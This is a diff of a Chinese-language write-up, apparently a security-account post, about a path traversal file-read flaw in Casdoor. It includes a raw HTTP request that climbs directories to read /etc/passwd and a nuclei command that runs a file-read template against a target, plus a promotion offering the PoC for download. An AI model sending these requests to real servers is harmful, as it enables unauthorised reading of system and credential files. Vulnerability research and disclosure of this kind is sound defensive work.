@@ -61,7 +61,7 @@ title="Casdoor"
 
 ```
 GET /static/../../../../../../../../../../../etc/passwd HTTP/1.1
-Host: xx.xx.xx.xx:9999
+Host: xx.xx.xx.xx:9999
 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
 Connection: close
 Accept: */*
@@ -101,7 +101,7 @@ nuclei poc 已上传网盘，后台回复【0006】免费获取
 单个目标扫描
 
 ```
- .\nuclei.exe -t .\casdoor-file-read.yaml -u http://x.x.x.x:9999 -me ttt
+ .\nuclei.exe -t .\casdoor-file-read.yaml -u http://x.x.x.x:9999 -me ttt
 
 ```
 
